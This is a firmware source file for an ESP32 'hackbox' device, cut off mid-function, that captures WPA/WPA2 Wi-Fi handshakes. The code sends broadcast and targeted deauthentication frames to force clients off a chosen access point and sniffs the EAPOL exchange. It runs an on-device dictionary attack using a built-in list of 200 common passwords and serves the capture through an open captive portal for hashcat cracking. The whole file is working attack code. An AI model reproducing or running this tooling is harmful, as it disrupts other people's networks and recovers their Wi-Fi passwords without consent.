/*
    hackbox
    hackbox custom firmware

    Handshake Capture Tool
    Scan -> Select AP -> Deauth client -> Capture EAPOL 4-way handshake
    -> Export via WiFi AP captive portal download page

    Saves handshake in hccapx format for hashcat cracking.
*/

#include "../include/handshake_capture.h"
#include "../include/level_system.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/setting.h"
#include "../include/wifi_utils.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <string.h>
#include "mbedtls/pkcs5.h"
#include "mbedtls/md.h"
#include "mbedtls/sha1.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

namespace {

// Writes a "# <label>: <value>" comment line to Serial with any CR
// or LF bytes in <value> replaced by '_'. The serial dumps emitted
// by this tool (hccapx export, cracked-password announce, etc.) are
// one-comment-per-line and parsed by tools tailing the serial stream;
// a newline embedded in an SSID or password would otherwise split a
// single-line header in half and break the parse.
void emitSafeComment(const char *label, const char *value) {
    Serial.print("# ");
    Serial.print(label);
    Serial.print(": ");
    for (const char *s = value; *s; ++s) {
        char c = *s;
        if (c == '\n' || c == '\r') c = '_';
        Serial.write((uint8_t)c);
    }
    Serial.println();
}

// ===== States =====
enum HSState {
    HS_SCANNING,
    HS_SELECT_AP,
    HS_DEAUTH_SNIFF,
    HS_CAPTURED,
    HS_CRACKING,
    HS_CRACKED,
    HS_EXPORTING
};

HSState currentState = HS_SCANNING;
bool needsRedraw = true;

// ===== AP List =====
// mfpStatus: 0=none, 1=MFP capable, 2=MFP required
struct APInfo {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    int8_t rssi;
    uint8_t authmode;
    uint8_t mfpStatus;
};

const int MAX_APS = 25;
APInfo apList[MAX_APS];
int apCount = 0;
int selectedAP = 0;
int listOffset = 0;

// ===== EAPOL Capture =====
// hccapx structure (393 bytes) ,hashcat format
struct __attribute__((packed)) hccapx_t {
    uint32_t signature;       // HCCAPX_SIGNATURE = 0x58504348
    uint32_t version;         // 4
    uint8_t  message_pair;    // bitmask
    uint8_t  essid_len;
    uint8_t  essid[32];
    uint8_t  keyver;          // 1=WPA, 2=WPA2
    uint8_t  keymic[16];
    uint8_t  mac_ap[6];
    uint8_t  nonce_ap[32];
    uint8_t  mac_sta[6];
    uint8_t  nonce_sta[32];
    uint16_t eapol_len;
    uint8_t  eapol[256];
};

hccapx_t handshake;
volatile bool handshakeValid = false;

// EAPOL frame tracking - volatile because written in ISR (eapolSniffer), read in main loop
volatile bool gotMsg1 = false;
volatile bool gotMsg2 = false;
volatile bool gotMsg3 = false;
volatile bool gotMsg4 = false;
uint8_t anonce[32];
uint8_t snonce[32];
uint8_t staMac[6];
uint8_t eapolMsg2[256];
uint16_t eapolMsg2Len = 0;

// Deauth
uint32_t deauthsSent = 0;
unsigned long lastDeauth = 0;
unsigned long captureStartTime = 0;
const unsigned long DEAUTH_INTERVAL = 2000;

// Export
WebServer hsServer(80);
DNSServer hsDNS;
esp_netif_t *hs_ap_netif = NULL;
bool exportRunning = false;

// ===== Cracker =====
int crackIndex = 0;
bool crackRunning = false;
bool crackFound = false;
char crackedPassword[64];
unsigned long crackStartTime = 0;

// Top 200 most common WiFi passwords
const char* const wordlist[] PROGMEM = {
    "password", "12345678", "123456789", "1234567890", "qwerty123",
    "password1", "iloveyou", "00000000", "11111111", "12341234",
    "admin123", "abc12345", "abcdefgh", "88888888", "internet",
    "password123", "football", "baseball", "dragon12", "monkey12",
    "letmein1", "trustno1", "sunshine", "princess", "whatever",
    "shadow12", "superman", "michael1", "charlie1", "master12",
    "qwerty12", "jennifer", "11223344", "computer", "michelle",
    "jordan23", "thomas12", "1q2w3e4r", "password12", "welcome1",
    "ginger12", "chicken1", "passw0rd", "wireless", "security",
    "netgear1", "linksys1", "default1", "changeme", "dlink123",
    "admin1234", "guest1234", "homewifi", "mywifi123", "wifi1234",
    "wifi12345", "wifipass", "pass1234", "test1234", "hello123",
    "family12", "qwerty1234", "asdfghjk", "zxcvbnm1", "1qaz2wsx",
    "qazwsxedc", "1234qwer", "qwer1234", "q1w2e3r4", "zaq12wsx",
    "access14", "p@ssw0rd", "passpass", "passwd12", "pa55w0rd",
    "summer12", "winter12", "spring12", "garden12", "flower12",
    "america1", "phoenix1", "killer12", "pepper12", "george12",
    "123456abc", "abc123456", "87654321", "12344321", "99999999",
    "55555555", "22222222", "33333333", "66666666", "77777777",
    "startrek", "starwars", "pokemon1", "pirates1", "matrix12",
    "tigger12", "buster12", "bailey12", "nothing1", "freedom1",
    "forever1", "diamond1", "jackson1", "william1", "richard1",
    "jessica1", "samsung1", "anthony1", "robert12", "matthew1",
    "corvette", "mercedes", "bigdaddy", "a1b2c3d4", "aabbccdd",
    "internet1", "password2", "pa55word", "123abc456", "network1",
    "netw0rk1", "router12", "comcast1", "spectrum", "verizon1",
    "xfinity1", "frontier", "att12345", "tmobile1", "sprint12",
    "apple123", "google12", "amazon12", "alexanet", "smarthome",
    "mynetwork", "homenet1", "house123", "family123", "kids1234",
    "guest123", "visitor1", "welcome123", "connect1", "setup123",
    "install1", "config12", "private1", "personal", "mypasswd",
    "openopen", "backdoor", "hacker12", "rootroot", "toor1234",
    "alexander", "elephant", "dolphins", "steelers", "patriots",
    "lakers12", "yankees1", "cowboys1", "packers1", "broncos1",
    "chelsea1", "arsenal1", "liverpool", "barcelona", "realmadrid",
    "minecraft", "fortnite", "roblox12", "facebook", "instagram",
    "twitter1", "snapchat", "tiktok12", "youtube1", "netflix1",
    "spotify1", "disney12", "iphone12", "samsung12", "android1",
    "windows1", "apple1234", "macbook1", "laptop12", "desktop1"
};
const int WORDLIST_SIZE = 200;

// HMAC-SHA1
void hmac_sha1(const uint8_t *key, int keyLen, const uint8_t *data, int dataLen, uint8_t *out) {
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
    mbedtls_md_hmac_starts(&ctx, key, keyLen);
    mbedtls_md_hmac_update(&ctx, data, dataLen);
    mbedtls_md_hmac_finish(&ctx, out);
    mbedtls_md_free(&ctx);
}

// WPA2 PMK derivation (PBKDF2-SHA1, 4096 rounds)
// Uses the classic context-based mbedtls API (matches espressif32 6.x).
void deriveWPA2PMK(const char *password, const char *ssid, uint8_t *pmk) {
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
    mbedtls_pkcs5_pbkdf2_hmac(&ctx,
        (const uint8_t*)password, strlen(password),
        (const uint8_t*)ssid, strlen(ssid),
        4096, 32, pmk);
    mbedtls_md_free(&ctx);
}

// PRF-384 for PTK derivation (simplified ,only need KCK, first 16 bytes)
void derivePTK_KCK(const uint8_t *pmk, const uint8_t *aa, const uint8_t *spa,
                    const uint8_t *anonce, const uint8_t *snonce, uint8_t *kck) {
    // Build the data string: min(AA,SPA) || max(AA,SPA) || min(ANonce,SNonce) || max(ANonce,SNonce)
    uint8_t data[76];
    int pos = 0;

    // MAC addresses: smaller first
    if (memcmp(aa, spa, 6) < 0) {
        memcpy(&data[pos], aa, 6); pos += 6;
        memcpy(&data[pos], spa, 6); pos += 6;
    } else {
        memcpy(&data[pos], spa, 6); pos += 6;
        memcpy(&data[pos], aa, 6); pos += 6;
    }

    // Nonces: smaller first
    if (memcmp(anonce, snonce, 32) < 0) {
        memcpy(&data[pos], anonce, 32); pos += 32;
        memcpy(&data[pos], snonce, 32); pos += 32;
    } else {
        memcpy(&data[pos], snonce, 32); pos += 32;
        memcpy(&data[pos], anonce, 32); pos += 32;
    }

    // PRF-X: HMAC-SHA1(PMK, "Pairwise key expansion" || 0x00 || data || counter)
    const char *label = "Pairwise key expansion";
    int labelLen = 22;
    uint8_t input[100];
    memcpy(input, label, labelLen);
    input[labelLen] = 0x00;
    memcpy(&input[labelLen + 1], data, 76);
    input[labelLen + 1 + 76] = 0x00; // counter = 0 for first 20 bytes

    uint8_t prf_out[20];
    hmac_sha1(pmk, 32, input, labelLen + 1 + 76 + 1, prf_out);
    memcpy(kck, prf_out, 16); // KCK = first 16 bytes of PTK
}

// Try one password against the captured handshake.
// Attempts the MIC comparison twice: once with handshake.eapol_len, and if
// that fails, once with (handshake.eapol_len - 4). The fallback recovers
// handshakes captured by earlier firmware builds where sig_len-derived
// eapolLen mistakenly included the 4-byte 802.11 FCS ,those stored frames
// are still crackable because the MIC is at a fixed offset and the trailing
// FCS bytes are the only garbage. After a reflash with the capture fix in
// place, the first attempt will succeed and the fallback is never hit.
bool tryPassword(const char *password) {
    APInfo &ap = apList[selectedAP];

    // Step 1: PMK = PBKDF2(password, SSID, 4096, 32)
    uint8_t pmk[32];
    deriveWPA2PMK(password, ap.ssid, pmk);

    // Step 2: PTK KCK from PMK + addresses + nonces
    uint8_t kck[16];
    derivePTK_KCK(pmk, ap.bssid, handshake.mac_sta, anonce, snonce, kck);

    // Step 3: Compute MIC over EAPOL msg2 (with MIC field zeroed)
    uint8_t eapolCopy[256];
    memcpy(eapolCopy, handshake.eapol, handshake.eapol_len);
    // MIC is already zeroed in our stored eapol

    uint8_t computedMIC[20];
    hmac_sha1(kck, 16, eapolCopy, handshake.eapol_len, computedMIC);
    if (memcmp(computedMIC, handshake.keymic, 16) == 0) return true;

    // Fallback: retry with eapol_len - 4 to recover handshakes captured
    // before the FCS-inclusive-length bug was fixed. Safe false-positive
    // rate is 2^-128 on any arbitrary 4-byte trim.
    if (handshake.eapol_len > 103) {
        hmac_sha1(kck, 16, eapolCopy, handshake.eapol_len - 4, computedMIC);
        if (memcmp(computedMIC, handshake.keymic, 16) == 0) return true;
    }

    return false;
}

// ===== Deauth Frame =====
// Deauth frame construction now uses shared sendDeauthFrame() from wifi_utils

void sendDeauth() {
    APInfo &ap = apList[selectedAP];
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Send multiple deauth frames for reliability
    // Broadcast deauth (kicks all clients)
    for (int i = 0; i < 3; i++) {
        sendDeauthFrame(broadcast, ap.bssid, ap.bssid, 0x0007); // Class 3 frame
        delay(2);
    }
    // Also send disassociation frames
    for (int i = 0; i < 3; i++) {
        // Disassoc frame: type 0xA0 instead of 0xC0
        uint8_t disassoc[26] = {
            0xA0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // broadcast
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // AP
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
            0x00, 0x00, 0x08, 0x00              // reason: disassociated
        };
        memcpy(disassoc + 10, ap.bssid, 6);
        memcpy(disassoc + 16, ap.bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, disassoc, sizeof(disassoc), false);
        delay(2);
    }
    // If we captured a STA MAC, send targeted deauth to that specific client
    if (gotMsg1 || gotMsg2) {
        for (int i = 0; i < 3; i++) {
            sendDeauthFrame(staMac, ap.bssid, ap.bssid, 0x0007);
            delay(2);
        }
    }
    deauthsSent++;
}

// ===== EAPOL Sniffer =====
void IRAM_ATTR eapolSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    if (handshakeValid) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    // Check if this frame involves our target AP
    // 802.11 data frame addressing:
    //   addr1 (offset 4): receiver
    //   addr2 (offset 10): transmitter
    //   addr3 (offset 16): BSSID (in most cases)
    APInfo &ap = apList[selectedAP];

    // Check transmitter (addr2) and BSSID (addr3) for AP match
    bool fromAP = memcmp(&frame[10], ap.bssid, 6) == 0; // Transmitter is AP
    bool toAP = memcmp(&frame[4], ap.bssid, 6) == 0;    // Receiver is AP
    // Also check addr3 (BSSID field)
    bool bssidMatch = memcmp(&frame[16], ap.bssid, 6) == 0;
    if (!fromAP && !toAP && !bssidMatch) return;

    // Data frame with QoS?
    uint8_t fc0 = frame[0];
    uint8_t ftype = (fc0 >> 2) & 0x03;
    uint8_t fsubtype = (fc0 >> 4) & 0x0F;
    if (ftype != 2) return;

    int hdrLen = 24;
    if (fsubtype & 0x08) hdrLen += 2; // QoS
    if (len < hdrLen + 8) return;

    // Check LLC/SNAP for EAPOL ethertype 0x888E
    const uint8_t *llc = &frame[hdrLen];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    uint16_t etherType = (llc[6] << 8) | llc[7];
    if (etherType != 0x888E) return;

    const uint8_t *eapol = &llc[8];
    // Use the 802.1X header's declared body length (offset 2-3, big-endian)
    // instead of deriving from pkt->rx_ctrl.sig_len. sig_len includes the
    // 4-byte 802.11 FCS on most ESP-IDF builds, which caused every HMAC-SHA1
    // over the captured EAPOL to hash 4 extra trailing bytes and fail
    // against the real MIC. Trusting the in-frame length field is also
    // robust to A-MSDU padding / vendor trailers.
    int available = len - hdrLen - 8;
    if (available < 4) return;
    int eapolLen = 4 + ((eapol[2] << 8) | eapol[3]);
    if (eapolLen < 99 || eapolLen > 256) return;
    if (eapolLen > available) return;

    // EAPOL-Key frame: version(1) + type(1) + length(2) + descriptor(1) + key_info(2) + ...
    uint8_t eapolType = eapol[1];
    if (eapolType != 3) return; // Must be EAPOL-Key

    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool keyAck = (keyInfo >> 7) & 1;
    bool keyMIC = (keyInfo >> 8) & 1;
    bool secure = (keyInfo >> 9) & 1;
    bool install = (keyInfo >> 6) & 1;

    // Message 1: AP -> STA, ACK set, MIC clear
    if (keyAck && !keyMIC && fromAP) {
        memcpy(anonce, &eapol[17], 32); // ANonce at offset 17
        memcpy(staMac, &frame[4], 6);   // Destination = STA
        gotMsg1 = true;
        needsRedraw = true;
    }

    // Message 2: STA -> AP, ACK clear, MIC set
    if (!keyAck && keyMIC && !secure && toAP) {
        memcpy(snonce, &eapol[17], 32); // SNonce
        if (!gotMsg1) {
            memcpy(staMac, &frame[10], 6); // Source = STA
        }
        eapolMsg2Len = eapolLen > 256 ? 256 : eapolLen;
        memcpy(eapolMsg2, eapol, eapolMsg2Len);
        gotMsg2 = true;
        needsRedraw = true;
    }

    // Message 3: AP -> STA, ACK set, MIC set, install set
    if (keyAck && keyMIC && install && fromAP) {
        gotMsg3 = true;
        needsRedraw = true;
    }

    // Message 4: STA -> AP, ACK clear, MIC set, secure set
    if (!keyAck && keyMIC && secure && toAP) {
        gotMsg4 = true;
        addXP(15);
        needsRedraw = true;
    }

    // Check if we have a valid handshake (need at least msg1 + msg2)
    if (gotMsg1 && gotMsg2) {
        APInfo &ap = apList[selectedAP];

        handshake.signature = 0x58504348; // "HCPX"
        handshake.version = 4;
        handshake.message_pair = gotMsg3 ? 0 : 2; // 0=M1+M2+M3, 2=M1+M2 only

        handshake.essid_len = strlen(ap.ssid);
        memset(handshake.essid, 0, 32);
        memcpy(handshake.essid, ap.ssid, handshake.essid_len);

        handshake.keyver = (keyInfo & 0x07); // 1=WPA, 2=WPA2

        // Extract MIC from message 2 (offset 81, 16 bytes)
        memcpy(handshake.keymic, &eapolMsg2[81], 16);

        memcpy(handshake.mac_ap, ap.bssid, 6);
        memcpy(handshake.nonce_ap, anonce, 32);
        memcpy(handshake.mac_sta, staMac, 6);
        memcpy(handshake.nonce_sta, snonce, 32);

        handshake.eapol_len = eapolMsg2Len;
        memset(handshake.eapol, 0, 256);
        memcpy(handshake.eapol, eapolMsg2, eapolMsg2Len);

        // Zero out MIC in the stored EAPOL for hashcat
        memset(&handshake.eapol[81], 0, 16);

        handshakeValid = true;
        needsRedraw = true;
    }
}

// ===== Export Web Portal =====
const char* exportHTML = R"rawhtml(
<!DOCTYPE html>
<html>
<head>
<title>hackbox // handshake</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050505;color:#00ff41;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#0a0a0a;border:1px solid #0d2e0d;max-width:400px;width:100%;margin:16px;padding:32px;text-align:center}
h1{font-size:18px;letter-spacing:2px;margin-bottom:4px}
.sub{color:#008f11;font-size:11px;margin-bottom:24px}
.info{text-align:left;font-size:12px;margin-bottom:20px;line-height:2}
.info span{color:#008f11}
.dl{display:inline-block;padding:14px 32px;background:#00ff41;color:#050505;font-family:inherit;font-size:14px;font-weight:bold;text-decoration:none;letter-spacing:1px;text-transform:uppercase}
.dl:hover{background:#00cc33}
.note{color:#0d2e0d;font-size:10px;margin-top:20px;line-height:1.5}
</style>
</head>
<body>
<div class="card">
<h1>hackbox</h1>
<div class="sub">handshake captured</div>
<div class="info" id="info">Loading...</div>
<a class="dl" href="/download" id="dlbtn">Download .hccapx</a>
<div id="cracklink" style="margin-top:14px;display:none">
<a class="dl" id="crackbtn" href="#" style="background:#ff6600;margin-top:8px" target="_blank">Crack on ck42x.com</a>
</div>
<div class="note">hashcat -m 2500 capture.hccapx wordlist.txt</div>
</div>
<script>
var x=new XMLHttpRequest();
x.open('GET','/info');
x.onload=function(){
  if(x.status===200){
    var d=JSON.parse(x.responseText);
    document.getElementById('info').innerHTML=
      '<span>SSID:</span> '+d.ssid+'<br>'+
      '<span>BSSID:</span> '+d.bssid+'<br>'+
      '<span>STA:</span> '+d.sta+'<br>'+
      '<span>Type:</span> '+(d.keyver===2?'WPA2':'WPA')+'<br>'+
      '<span>Msgs:</span> '+d.msgs;
    var ssid=encodeURIComponent(d.ssid);
    var bssid=encodeURIComponent(d.bssid);
    var cb=document.getElementById('crackbtn');
    cb.href='https://ck42x.com/crack?ssid='+ssid+'&bssid='+bssid;
    document.getElementById('cracklink').style.display='block';
  }
};
x.send();
</script>
</body>
</html>
)rawhtml";

void handleExportPage() {
    hsServer.send(200, "text/html", exportHTML);
}

void handleInfo() {
    APInfo &ap = apList[selectedAP];
    char bssid[18], sta[18];
    snprintf(bssid, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    snprintf(sta, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             handshake.mac_sta[0], handshake.mac_sta[1], handshake.mac_sta[2],
             handshake.mac_sta[3], handshake.mac_sta[4], handshake.mac_sta[5]);

    String msgs = "";
    if (gotMsg1) msgs += "1";
    if (gotMsg2) msgs += msgs.length() ? "+2" : "2";
    if (gotMsg3) msgs += msgs.length() ? "+3" : "3";
    if (gotMsg4) msgs += msgs.length() ? "+4" : "4";

    String json = "{\"ssid\":\"";
    json += ap.ssid;
    json += "\",\"bssid\":\"";
    json += bssid;
    json += "\",\"sta\":\"";
    json += sta;
    json += "\",\"keyver\":";
    json += String(handshake.keyver);
    json += ",\"msgs\":\"";
    json += msgs;
    json += "\"}";
    hsServer.send(200, "application/json", json);
}

void handleDownload() {
    hsServer.sendHeader("Content-Disposition", "attachment; filename=\"capture.hccapx\"");
    hsServer.send_P(200, "application/octet-stream", (const char*)&handshake, sizeof(hccapx_t));
}

void startExportAP() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(50);

    if (hs_ap_netif) { esp_netif_destroy(hs_ap_netif); hs_ap_netif = NULL; }
    hs_ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, "hackbox", sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid[sizeof(ap_config.ap.ssid) - 1] = '\0';
    ap_config.ap.ssid_len = strlen((char*)ap_config.ap.ssid);
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(hs_ap_netif, &ip_info) == ESP_OK) {
        IPAddress apIP(ip_info.ip.addr);
        hsDNS.start(53, "*", apIP);
    }

    hsServer.on("/", handleExportPage);
    hsServer.on("/info", handleInfo);
    hsServer.on("/download", handleDownload);
    hsServer.on("/generate_204", handleExportPage);
    hsServer.on("/hotspot-detect.html", handleExportPage);
    hsServer.on("/connecttest.txt", handleExportPage);
    hsServer.on("/redirect", handleExportPage);
    hsServer.on("/canonical.html", handleExportPage);
    hsServer.on("/success.txt", handleExportPage);
    hsServer.onNotFound(handleExportPage);
    hsServer.begin();
    exportRunning = true;
}

// ===== Display =====
void drawScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    switch (currentState) {
        case HS_SCANNING: {
            u8g2.drawStr(0, 8, "Scanning for targets...");
            char buf[32];
            snprintf(buf, sizeof(buf), "Found: %d APs", apCount);
            u8g2.drawStr(0, 20, buf);
            u8g2.drawStr(0, 62, "Please wait...");
            break;
        }
        case HS_SELECT_AP: {
            u8g2.drawStr(0, 8, "Select Target AP:");
            u8g2.drawHLine(0, 10, 128);
            for (int i = 0; i < 5 && (listOffset + i) < apCount; i++) {
                int idx = listOffset + i;
                APInfo &a = apList[idx];
                char line[28];
                char maskedSSID[20];
                if (privacyModeEnabled) {
                    snprintf(maskedSSID, sizeof(maskedSSID), "****");
                } else {
                    strncpy(maskedSSID, a.ssid, 14);
                    maskedSSID[14] = '\0';
                }
                const char* mfpTag = a.mfpStatus >= 2 ? "[MFP!]" : (a.mfpStatus >= 1 ? "[pmf]" : "");
                snprintf(line, sizeof(line), "%s%-11s %4ddBm%s",
                         idx == selectedAP ? ">" : " ", maskedSSID, a.rssi, mfpTag);
                u8g2.drawStr(0, 20 + (i * 9), line);
            }
            u8g2.drawStr(0, 62, "U/D=Scroll R=Select L=Back");
            break;
        }
        case HS_DEAUTH_SNIFF: {
            APInfo &a = apList[selectedAP];
            char buf[32];

            if (a.mfpStatus >= 2) {
                u8g2.drawStr(0, 8, "MFP REQUIRED - IMMUNE");
            } else if (a.mfpStatus >= 1) {
                u8g2.drawStr(0, 8, "PMF capable - partial");
            } else {
                u8g2.drawStr(0, 8, "Capturing handshake...");
            }
            u8g2.drawHLine(0, 10, 128);

            snprintf(buf, sizeof(buf), "AP: %.16s", a.ssid);
            u8g2.drawStr(0, 20, buf);
            snprintf(buf, sizeof(buf), "Ch: %d  Deauths: %lu", a.channel, (unsigned long)deauthsSent);
            u8g2.drawStr(0, 30, buf);

            // EAPOL progress
            snprintf(buf, sizeof(buf), "M1:%s M2:%s M3:%s M4:%s",
                     gotMsg1 ? "Y" : "-", gotMsg2 ? "Y" : "-",
                     gotMsg3 ? "Y" : "-", gotMsg4 ? "Y" : "-");
            u8g2.drawStr(0, 42, buf);

            unsigned long elapsed = (millis() - captureStartTime) / 1000;
            snprintf(buf, sizeof(buf), "Time: %lus", elapsed);
            u8g2.drawStr(0, 52, buf);

            u8g2.drawStr(0, 62, "L=Abort  Waiting...");
            break;
        }
        case HS_CAPTURED: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "HANDSHAKE CAPTURED!");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            APInfo &a = apList[selectedAP];
            char buf[32];
            snprintf(buf, sizeof(buf), "SSID: %.18s", a.ssid);
            u8g2.drawStr(0, 22, buf);
            snprintf(buf, sizeof(buf), "Type: %s", handshake.keyver == 2 ? "WPA2" : "WPA");
            u8g2.drawStr(0, 32, buf);

            char msgs[16] = "";
            if (gotMsg1) strcat(msgs, "1");
            if (gotMsg2) strcat(msgs, gotMsg1 ? "+2" : "2");
            if (gotMsg3) strcat(msgs, "+3");
            if (gotMsg4) strcat(msgs, "+4");
            snprintf(buf, sizeof(buf), "Msgs: %s", msgs);
            u8g2.drawStr(0, 42, buf);

            u8g2.drawStr(0, 52, "R=Export  U=Crack");
            u8g2.drawStr(0, 62, "D=Serial  L=Back");
            break;
        }
        case HS_CRACKING: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "CRACKING...");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            char buf[32];
            snprintf(buf, sizeof(buf), "%d / %d passwords", crackIndex, WORDLIST_SIZE);
            u8g2.drawStr(0, 24, buf);

            // Progress bar
            int barW = (crackIndex * 120) / WORDLIST_SIZE;
            u8g2.drawFrame(4, 32, 120, 8);
            if (barW > 0) u8g2.drawBox(6, 34, barW > 116 ? 116 : barW, 4);

            if (crackIndex < WORDLIST_SIZE) {
                snprintf(buf, sizeof(buf), "Trying: %.20s", wordlist[crackIndex]);
                u8g2.drawStr(0, 48, buf);
            }

            unsigned long elapsed = (millis() - crackStartTime) / 1000;
            snprintf(buf, sizeof(buf), "%lus elapsed", elapsed);
            u8g2.drawStr(0, 58, buf);
            u8g2.drawStr(80, 62, "L=Abort");
            break;
        }
        case HS_CRACKED: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "PASSWORD FOUND!");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            APInfo &a = apList[selectedAP];
            char buf[32];
            snprintf(buf, sizeof(buf), "SSID: %.18s", a.ssid);
            u8g2.drawStr(0, 24, buf);
            snprintf(buf, sizeof(buf), "Pass: %.20s", crackedPassword);
            u8g2.drawStr(0, 36, buf);

            u8g2.drawStr(0, 50, "R=Export  D=Serial");
            u8g2.drawStr(0, 62, "L=Back");
            break;
        }
        case HS_EXPORTING: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "EXPORT READY");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            u8g2.drawStr(0, 24, "Connect to WiFi:");
            u8g2.drawStr(0, 34, "hackbox");
            u8g2.drawStr(0, 46, "Auto-popup or open");
            u8g2.drawStr(0, 54, "192.168.4.1");
            u8g2.drawStr(0, 62, "L=Back");
            break;
        }
    }

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ===== Scan =====
// ===== RSN / MFP beacon parser =====
// Parses a beacon frame payload and sets mfpCapable/mfpRequired on the
// matching APInfo entry. Uses the RSN Information Element (ID 0x30).
// RSN Capabilities are 2 bytes at a variable offset after the cipher lists.
//   Bit 6 (0x40 in low byte): MFPR — Management Frame Protection Required
//   Bit 7 (0x80 in low byte): MFPC — Management Frame Protection Capable
static void beaconSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    // Beacon frame subtype = 0x80
    if (len < 36 || (frame[0] & 0xFC) != 0x80) return;

    const uint8_t *bssid = &frame[16]; // addr3 = BSSID in beacon

    // Find matching AP in our list
    int idx = -1;
    for (int i = 0; i < apCount; i++) {
        if (memcmp(apList[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    if (idx < 0) return;

    // 802.11 fixed parameters: 12 bytes (timestamp 8 + interval 2 + caps 2)
    // Then variable IEs start at offset 36 from frame start
    const uint8_t *ie = frame + 36;
    int remaining = (int)len - 36;

    while (remaining >= 2) {
        uint8_t id  = ie[0];
        uint8_t iel = ie[1];
        if (remaining < 2 + iel) break;

        if (id == 0x30 && iel >= 8) { // RSN Information Element
            // Layout: 2 version + 4 group cipher + 2 pairwise count
            int offset = 2 + 4;
            if (offset + 1 >= iel) { ie += 2 + iel; remaining -= 2 + iel; continue; }
            uint16_t pwCount = ie[2 + offset] | ((uint16_t)ie[2 + offset + 1] << 8);
            offset += 2 + 4 * pwCount;
            if (offset + 1 >= iel) { ie += 2 + iel; remaining -= 2 + iel; continue; }
            uint16_t akmCount = ie[2 + offset] | ((uint16_t)ie[2 + offset + 1] << 8);
            offset += 2 + 4 * akmCount;
            // RSN Capabilities at offset (2 bytes)
            if (offset + 1 < iel) {
                uint8_t caps = ie[2 + offset]; // low byte has MFPC/MFPR
                if (caps & 0x40) apList[idx].mfpStatus = 2;       // MFPR = required
                else if (caps & 0x80) apList[idx].mfpStatus = 1;  // MFPC = capable
            }
            return;
        }

        ie += 2 + iel;
        remaining -= 2 + iel;
    }
}

// Run a short beacon sniff pass (150ms per unique channel) to populate MFP flags
static void probeMFP() {
    // Collect unique channels
    uint8_t channels[14] = {0};
    int chCount = 0;
    for (int i = 0; i < apCount; i++) {
        uint8_t ch = apList[i].channel;
        bool found = false;
        for (int j = 0; j < chCount; j++) if (channels[j] == ch) { found = true; break; }
        if (!found && chCount < 14) channels[chCount++] = ch;

        // WPA3 always requires MFP by spec — set immediately
        if (apList[i].authmode == WIFI_AUTH_WPA3_PSK) {
            apList[i].mfpStatus = 2; // required
        } else if (apList[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK) {
            if (apList[i].mfpStatus < 1) apList[i].mfpStatus = 1; // capable
        }
    }

    if (chCount == 0) return;

